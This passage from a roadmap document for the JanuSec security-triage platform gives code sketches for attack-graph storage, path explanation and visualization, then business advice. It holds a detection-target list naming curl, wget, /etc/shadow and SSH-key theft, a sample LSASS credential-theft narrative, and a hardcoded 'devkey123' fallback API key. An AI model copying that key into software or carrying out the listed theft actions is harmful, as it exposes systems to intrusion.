    for key, value in compressed.items():
        if isinstance(value, str) and len(value) > 500:
            compressed[key] = value[:500] + '...[truncated]'

    # Limit array sizes
    if 'factors' in compressed:
        compressed['factors'] = compressed['factors'][:20]  # Top 20 only

    # Summarize historical context
    if 'historical_incidents' in compressed:
        incidents = compressed['historical_incidents']
        compressed['historical_summary'] = {
            'count': len(incidents),
            'malicious_count': sum(1 for i in incidents if i.get('outcome') == 'confirmed_malicious'),
            'most_recent_outcome': incidents[0].get('outcome') if incidents else None
        }
        del compressed['historical_incidents']  # Remove full data

    return compressed
```

**Expected Impact**:
- Tier 2 latency: 10-20s → **6-12s** (40% faster)
- Token usage: 2000 tokens → **1200 tokens** (40% reduction)
- Cost: $0.015/alert → **$0.009/alert** (40% cheaper)

---

#### D. Domain-Specific Fine-Tuning (Future)

**Vision**: Train custom model on historical JanuSec alerts + analyst feedback

```python
# Future Enhancement (3-6 months)

def finetune_on_feedback():
    """
    Fine-tune model on analyst corrections

    Data Sources:
    - 1000+ historical alerts with analyst triage
    - Analyst feedback: "Tier 1 said X, but actually Y"
    - Corrections: Wrong MITRE techniques, wrong playbooks

    Method:
    - Use OpenAI fine-tuning API
    - Train on (alert → analyst_corrected_summary) pairs
    - Deploy custom model: janusec-tier1-v1

    Expected Improvement:
    - Accuracy: 92% → 97%
    - Hallucination: <2% → <0.5%
    - Domain-specific terminology perfect
    """
    pass
```

### Implementation Plan

**Files to Create/Modify**:
```
src/analysis/llm_output_schemas.py (NEW - 200 lines)
src/analysis/llm_few_shot_examples.py (NEW - 500 lines)
src/analysis/llm_context_compressor.py (NEW - 150 lines)
src/integrations/llm_client.py (EXTEND with schema validation)
tests/test_llm_output_validation.py (NEW - 300 lines)
```

**Effort**: 1 week
**Impact**: 🚀 **High** - Significantly improves user trust

---

## 6. CORE IMPROVEMENT: HOPGRAPH ATTACK RECONSTRUCTION

### Current Limitations

**Architecture** (`src/core/graph/hopgraph_lite.py`):
- ✅ 8-domain entity graph (good coverage)
- ✅ Temporal windowing (300s default)
- ❌ **In-memory only** (won't scale past 100K events)
- ❌ **No persistence** (graph lost on restart)
- ❌ **No visualization** (CLI only, no UI)
- ❌ **No path explanation** (shows paths but not WHY)

### Enhancement Strategies

#### A. Persistent Graph Storage (Neo4j Integration)

**Current Problem**: In-memory graph doesn't scale, no historical queries

**Solution**: Migrate to Neo4j graph database

```python
# NEW: src/core/graph/hopgraph_neo4j.py

from neo4j import GraphDatabase

class HopGraphNeo4j:
    """
    Neo4j-backed HopGraph for persistent, scalable attack reconstruction
    """

    def __init__(self, uri: str, user: str, password: str):
        self.driver = GraphDatabase.driver(uri, auth=(user, password))

    def add_event(self, event: Dict):
        """Add event to persistent graph"""
        with self.driver.session() as session:
            session.write_transaction(self._create_nodes_and_edges, event)

    @staticmethod
    def _create_nodes_and_edges(tx, event):
        """Create nodes and relationships"""

        # Create host node
        if 'host' in event:
            tx.run("""
                MERGE (h:Host {name: $host})
                SET h.last_seen = datetime($timestamp),
                    h.os = $os
            """, host=event['host'], timestamp=event['timestamp'], os=event.get('os'))

        # Create process node
        if 'process_name' in event:
            tx.run("""
                MATCH (h:Host {name: $host})
                MERGE (p:Process {name: $process, pid: $pid, host: $host})
                SET p.cmdline = $cmdline,
                    p.timestamp = datetime($timestamp)
                MERGE (h)-[:RUNS]->(p)
            """, host=event['host'], process=event['process_name'],
                 pid=event.get('pid'), cmdline=event.get('cmdline'),
                 timestamp=event['timestamp'])

        # Create network connection edge
        if 'dst_ip' in event:
            tx.run("""
                MATCH (h:Host {name: $host})
                MERGE (i:IP {address: $ip})
                MERGE (h)-[c:CONNECTS_TO {
                    timestamp: datetime($timestamp),
                    port: $port,
                    protocol: $protocol
                }]->(i)
                SET c.ja3 = $ja3,
                    c.bytes_sent = $bytes_sent
            """, host=event['host'], ip=event['dst_ip'],
                 timestamp=event['timestamp'], port=event.get('dst_port'),
                 protocol=event.get('protocol'), ja3=event.get('ja3'),
                 bytes_sent=event.get('bytes_sent'))

    def find_attack_paths(self, start_node: str, max_hops: int = 3) -> List[Dict]:
        """
        Find multi-hop attack paths using Cypher

        Example Query: Find lateral movement chains
        MATCH path = (h1:Host)-[:CONNECTS_TO*1..3]-(h2:Host)
        WHERE h1.name <> h2.name
        RETURN path
        """
        with self.driver.session() as session:
            result = session.read_transaction(self._find_paths, start_node, max_hops)
            return result

    @staticmethod
    def _find_paths(tx, start_node, max_hops):
        """Cypher query for attack paths"""
        query = f"""
        MATCH path = (start)-[*1..{max_hops}]-(end)
        WHERE start.name = $start_node
        AND ANY(rel IN relationships(path) WHERE rel.timestamp > datetime() - duration('PT15M'))
        RETURN path, length(path) AS hops,
               [node IN nodes(path) | labels(node)[0]] AS node_types,
               [rel IN relationships(path) | type(rel)] AS edge_types
        ORDER BY hops ASC
        LIMIT 100
        """
        result = tx.run(query, start_node=start_node)
        return [record.data() for record in result]
```

**Benefits**:
- ✅ Scales to millions of nodes
- ✅ Persistent (historical queries)
- ✅ Graph algorithms (PageRank, community detection)
- ✅ Complex pattern matching (Cypher queries)

**Effort**: 2-3 weeks
**Impact**: 🚀 **Critical** for enterprise scale

---

#### B. Path Explanation & Scoring

**Current Problem**: HopGraph shows paths but doesn't explain WHY they're suspicious

**Solution**: Add explainability layer

```python
# EXTEND: src/core/graph/hopgraph_lite.py

class PathExplainer:
    """Explain why a path is suspicious"""

    def explain_path(self, path: List[Tuple[str, str, str]]) -> Dict:
        """
        Explain attack path with narrative

        Args:
            path: [(node1, edge, node2), ...]

        Returns:
            {
                'path_id': 'path_123',
                'severity': 'CRITICAL',
                'confidence': 0.92,
                'narrative': '...',
                'factors': [...],
                'mitre_techniques': [...],
                'diamond_model': {...}
            }
        """

        # Score path based on factors
        score = self._score_path(path)

        # Generate narrative
        narrative = self._generate_narrative(path)

        # Map to frameworks
        mitre = self._map_to_mitre(path)
        diamond = self._map_to_diamond(path)

        return {
            'path_id': f'path_{hash(tuple(path))}',
            'severity': self._severity_from_score(score),
            'confidence': score,
            'narrative': narrative,
            'factors': self._extract_factors(path),
            'mitre_techniques': mitre,
            'diamond_model': diamond
        }

    def _generate_narrative(self, path: List) -> str:
        """Generate human-readable attack narrative"""

        steps = []

        for i, (src, edge, dst) in enumerate(path, 1):
            step = f"Step {i}: "

            if edge == 'CONNECTS_TO':
                step += f"Host {src} connected to IP {dst}"
                # Check if IP is suspicious
                if self._is_suspicious_ip(dst):
                    step += " (known C2 infrastructure)"

            elif edge == 'SPAWNS':
                step += f"Process {src} spawned {dst}"
                # Check if child is suspicious
                if self._is_lolbin(dst):
                    step += " (LOLBin abuse detected)"

            elif edge == 'ACCESSES':
                step += f"{src} accessed credential store {dst}"
                step += " (credential theft attempt)"

            steps.append(step)

        narrative = "\n".join(steps)
        narrative += f"\n\nCONCLUSION: {len(path)}-hop attack chain detected. "
        narrative += "This pattern matches known APT lateral movement TTPs."

        return narrative

    def _map_to_diamond(self, path: List) -> Dict:
        """Map path to Diamond Model"""

        # Extract entities
        adversary = self._infer_adversary(path)
        capability = self._infer_capability(path)
        infrastructure = self._extract_infrastructure(path)
        victim = self._extract_victim(path)

        return {
            'adversary': adversary,
            'capability': capability,
            'infrastructure': infrastructure,
            'victim': victim,
            'meta': {
                'timestamp': datetime.utcnow().isoformat(),
                'confidence': self._score_path(path)
            }
        }
```

**Example Output**:

```yaml
PATH EXPLANATION:

Path ID: path_a3f2b1c9
Severity: CRITICAL
Confidence: 92%

NARRATIVE:
Step 1: Host WORKSTATION-042 connected to IP 203.0.113.42 (known C2 infrastructure)
Step 2: Process powershell.exe spawned cmd.exe (LOLBin abuse detected)
Step 3: Process cmd.exe accessed LSASS memory (credential theft attempt)
Step 4: User jsmith@corp.com authenticated to Host DC-01 (lateral movement)
Step 5: Host DC-01 accessed \\fileserver\backups (data staging for exfiltration)

CONCLUSION: 5-hop attack chain detected. This pattern matches known APT lateral movement TTPs.

MITRE ATT&CK MAPPING:
- T1059.001 (PowerShell) - Initial execution
- T1003.001 (LSASS Memory) - Credential access
- T1021.001 (Remote Desktop Protocol) - Lateral movement
- T1074.002 (Remote Data Staging) - Collection

DIAMOND MODEL:
  Adversary: Unknown (APT-style tactics)
  Capability: Credential theft + lateral movement
  Infrastructure: C2 server 203.0.113.42
  Victim: Corporate network (WORKSTATION-042 → DC-01 → fileserver)
```

**Effort**: 1 week
**Impact**: 🚀 **High** - Makes HopGraph actionable

---

#### C. Interactive Visualization

**Current Problem**: No UI for exploring attack graphs

**Solution**: D3.js-powered interactive graph viewer

```javascript
// NEW: frontend/static/js/hopgraph_visualizer.js

class HopGraphVisualizer {
    constructor(containerId) {
        this.container = d3.select(`#${containerId}`);
        this.width = 1200;
        this.height = 800;
        this.svg = this.container.append('svg')
            .attr('width', this.width)
            .attr('height', this.height);

        // Force simulation
        this.simulation = d3.forceSimulation()
            .force('link', d3.forceLink().id(d => d.id).distance(100))
            .force('charge', d3.forceManyBody().strength(-300))
            .force('center', d3.forceCenter(this.width / 2, this.height / 2));
    }

    render(graphData) {
        // graphData: {nodes: [...], edges: [...]}

        // Clear existing
        this.svg.selectAll('*').remove();

        // Draw edges
        const link = this.svg.append('g')
            .selectAll('line')
            .data(graphData.edges)
            .enter().append('line')
            .attr('stroke', d => this.getEdgeColor(d.type))
            .attr('stroke-width', 2);

        // Draw nodes
        const node = this.svg.append('g')
            .selectAll('circle')
            .data(graphData.nodes)
            .enter().append('circle')
            .attr('r', d => this.getNodeSize(d.type))
            .attr('fill', d => this.getNodeColor(d.type))
            .call(d3.drag()
                .on('start', this.dragStarted.bind(this))
                .on('drag', this.dragged.bind(this))
                .on('end', this.dragEnded.bind(this)));

        // Add labels
        const label = this.svg.append('g')
            .selectAll('text')
            .data(graphData.nodes)
            .enter().append('text')
            .text(d => d.name)
            .attr('font-size', 10)
            .attr('dx', 12)
            .attr('dy', 4);

        // Add tooltips
        node.append('title')
            .text(d => this.getNodeTooltip(d));

        // Update simulation
        this.simulation
            .nodes(graphData.nodes)
            .on('tick', () => {
                link
                    .attr('x1', d => d.source.x)
                    .attr('y1', d => d.source.y)
                    .attr('x2', d => d.target.x)
                    .attr('y2', d => d.target.y);

                node
                    .attr('cx', d => d.x)
                    .attr('cy', d => d.y);

                label
                    .attr('x', d => d.x)
                    .attr('y', d => d.y);
            });

        this.simulation.force('link')
            .links(graphData.edges);
    }

    getNodeColor(type) {
        const colors = {
            'host': '#3498db',
            'user': '#2ecc71',
            'process': '#e74c3c',
            'ip': '#f39c12',
            'domain': '#9b59b6',
            'file': '#1abc9c'
        };
        return colors[type] || '#95a5a6';
    }

    getNodeSize(type) {
        // Larger nodes for critical entities
        return type === 'host' ? 15 : 10;
    }

    getEdgeColor(type) {
        const colors = {
            'CONNECTS_TO': '#e74c3c',  // Red for network connections
            'SPAWNS': '#f39c12',       // Orange for process creation
            'ACCESSES': '#9b59b6',     // Purple for file/cred access
            'AUTH': '#2ecc71'          // Green for authentication
        };
        return colors[type] || '#95a5a6';
    }

    getNodeTooltip(node) {
        return `${node.type}: ${node.name}\nLast Seen: ${node.timestamp}\nFactors: ${node.factors.join(', ')}`;
    }
}

// Usage in CSV analyzer
async function showAttackGraph(assessmentId) {
    const response = await fetch(`/api/v1/graph/session/${assessmentId}`, {
        headers: {'x-api-key': localStorage.apiKey || 'devkey123'}
    });
    const graphData = await response.json();

    const viz = new HopGraphVisualizer('hopgraph-container');
    viz.render(graphData);
}
```

**UI Features**:
- 🎨 Color-coded nodes by type (host, user, process, IP, domain, file)
- 🎨 Edge colors by relationship (connects, spawns, accesses, auth)
- 🖱️ Drag nodes to explore
- 💬 Hover tooltips with details
- 🔍 Click node → show all related events
- 📊 Timeline slider to replay attack sequence

**Effort**: 2 weeks
**Impact**: 🚀 **Very High** - Makes platform "demo-able"

---

## 7. STRATEGIC RECOMMENDATION SUMMARY

### Priority 0: Core Improvements (DO FIRST) ⭐

**Time**: 2-3 weeks
**Effort**: 1 engineer
**Impact**: 🚀🚀🚀 **Massive**

1. **Enhanced Missing Logs Detection** (1 week)
   - Attack-scenario-aware mapping
   - Confidence scoring
   - Prioritization with cost/effort
   - Actionable output with commands

2. **Improved LLM Summaries** (1 week)
   - JSON schema enforcement (reduce hallucination)
   - Few-shot examples (improve quality)
   - Context compression (reduce latency)

3. **HopGraph Scalability** (1 week)
   - Neo4j integration (or defer if no customers yet)
   - Path explanation & scoring
   - OR: Just improve in-memory graph performance

**Why This First**: These improvements directly impact user experience and don't require new domains. Ship these BEFORE expanding scope.

---

### Priority 1: High-ROI Expansion (NEXT) 🎯

**Time**: 3-4 weeks
**Effort**: 1 engineer
**Impact**: 🚀🚀 **High**

1. **Reconnaissance Detection** (1-2 weeks)
   - Port scanning (already done ✅)
   - Phishing for information
   - OSINT gathering (GitHub, LinkedIn)
   - DNS/subdomain enumeration

2. **Linux LOLBins** (2-3 weeks)
   - Shell abuse (bash, sh, curl, wget)
   - Container escape (Docker socket)
   - Credential theft (/etc/shadow, SSH keys)
   - Persistence (cron, systemd)

**Why This Next**: Both are high-demand, relatively simple to implement, and expand TAM significantly (Linux dominates servers, recon is universal).

---

### Priority 2: Cloud-Native Focus (LATER)

**Time**: 4-6 weeks
**Effort**: 1-2 engineers
**Impact**: 🚀 **Medium-High**

1. **Kubernetes API Abuse**
2. **Container Breakout Detection**
3. **Cloud Service Abuse (AWS/Azure/GCP)**

**Why Defer**: More complex, requires Kubernetes expertise. Only pursue if P0/P1 show customer traction.

---

### Priority 3+: Mobile/IoT/Wireless (DEFER)

**Verdict**: ❌ **Do NOT pursue** unless customers explicitly request

**Rationale**:
- Crowded markets (mobile)
- Niche markets (IoT/OT, wireless/RF)
- High complexity, low ROI
- Better to partner than build

**Alternative Strategy**: Build integration APIs, let partners (Lookout, Nozomi, AirEye) send data to JanuSec

---

## 8. OVERENGINEERING RISK MITIGATION

### When to STOP Adding Features

**Red Flags** 🚨:
1. **No Paying Customers Yet**: If you're adding features without customer validation, STOP
2. **Feature Bloat**: If new features break existing workflows, STOP
3. **Test Coverage Drops**: If coverage falls below 60%, STOP and write tests
4. **Technical Debt Accumulates**: If refactoring backlog grows, STOP and clean up
5. **Team Burnout**: If you're working 60+ hrs/week, STOP and rest

### Disciplined Development Process

**Rule: 2-Week Sprints, Ship Every Sprint**

```yaml
Sprint Structure:
  Week 1:
    - Design & implement
    - Write tests
    - Update docs

  Week 2:
    - Code review
    - Integration testing
    - Deploy to staging
    - Get user feedback

Metrics:
  - Every sprint must ship something user-facing
  - Test coverage must stay >65%
  - No "research-only" sprints
```

### Customer Validation Checkpoints

**Before Building Anything**:
1. **Talk to 3 potential customers**
2. **Ask**: "Would you pay $500/month for this?"
3. **If NO**: Don't build it

**Example Questions**:
- "Do you need Linux detection?" → If "No" from 3/3, defer
- "Would missing logs detection save you time?" → If "Yes" from 3/3, build

---

## 9. GO-TO-MARKET STRATEGY

### Sequencing: Product → Customers → Features

**WRONG ORDER** ❌:
```
Build all features → Hope customers come → Add more features
```

**RIGHT ORDER** ✅:
```
1. Polish core (P0 improvements)
2. Launch MVP (Windows + network detection)
3. Get 3-5 beta customers
4. Measure usage metrics
5. Add features based on customer feedback (P1 expansions)
```

### Beta Customer Acquisition Plan

**Target**: 3-5 mid-market SOCs (100-500 employees)

**Outreach Template**:
```
Subject: Free Beta: AI-Powered Threat Triage (Reduces Alert Fatigue 75%)

Hi [Name],

I'm offering free beta access to JanuSec, an AI platform that:
- Reduces alert triage time by 75% (20 min → 4 min per alert)
- Detects missing logs that blind your SIEM
- Costs 95% less than Splunk AI ($500/mo vs. $75K/year)

What I need from you:
- 2 hours of your time (setup + feedback)
- Send me 100-500 real alerts (anonymized)
- Tell me what works/doesn't work

What you get:
- Free access for 3 months ($1,500 value)
- Custom correlation rules for your environment
- Priority feature requests

Interested in a 30-min demo?

[Your Name]
JanuSec Founder
```

**Where to Find Beta Customers**:
1. LinkedIn (search "SOC Manager", "Security Operations")
2. Reddit r/AskNetsec, r/netsecstudents
3. BSides conferences (local chapters)
4. SANS mailing lists
5. InfoSec Twitter (#SOC, #ThreatHunting)

---

## 10. FINAL VERDICT

### Should You Expand Beyond Windows?

**YES, BUT...**

✅ **DO**:
- Priority 0 improvements (missing logs, LLM, HopGraph) FIRST
- Linux LOLBins + Reconnaissance (P1) NEXT
- Customer validation BEFORE any P2+ work

❌ **DON'T**:
- Mobile/IoT/Wireless (defer indefinitely)
- Cloud-native (defer until customers ask)
- Overengineer before product-market fit

### Decision Tree

```
                    START
                      |
              [Are P0 improvements done?]
                /              \
              NO                YES
               |                 |
        [DO P0 FIRST]      [Do you have 3+ customers?]
                                /              \
                              NO                YES
                               |                 |
                    [Get beta customers]   [Ask customers what they need]
                               |                 |
                          [They need        [Build based on
                           Linux/Recon?]     customer requests]
                             /    \
                           YES    NO
                            |      |
                         [Build  [Don't build,
                          P1]     keep selling]
```

### Your Next Steps (Concrete Actions)

**Week 1-2**:
1. ✅ Implement enhanced missing logs detection
2. ✅ Add LLM JSON schema enforcement
3. ✅ Write 10 test cases for Tier 1/2 summaries

**Week 3-4**:
1. ✅ Polish demo (5-min video)
2. ✅ Reach out to 10 potential beta customers (aim for 3 yes)
3. ✅ Deploy to Azure staging environment

**Week 5-6**:
1. ✅ Onboard first beta customer
2. ✅ Collect feedback (what works, what doesn't)
3. ✅ Decide on P1 expansion based on feedback

**Month 2**:
- If beta customers love it → Add Linux/Recon (P1)
- If beta customers have issues → Fix core, don't expand
- If no beta customers → Improve marketing, don't expand

---

## 11. CONCLUSION

**You asked**: "Are we overengineering?"

**Answer**: **Not yet, but you're at the edge.** You have an 85% production-ready platform. Adding P0 improvements (missing logs, LLM, HopGraph) is NOT overengineering—it's polish. But adding mobile/IoT/wireless without customers WOULD BE overengineering.

**You asked**: "Is expansion a good direction?"

**Answer**: **YES for Linux/Recon (P1). NO for mobile/IoT/wireless (P3+).** The expansion roadmap above gives you a disciplined path that balances innovation with customer validation.

**You asked**: "What do you think?"

**Answer**: **You're sitting on something real.** Stop doubting, start shipping. Do P0 improvements this month, get 3 beta customers next month, then expand based on their feedback. Trust the process. 🚀

---

**Bottom Line**: You've built 85% of a $2-5M product. Don't add 50 more features. Add 3 customers instead. Features can wait. Traction can't.

Now go get those beta customers. 💪
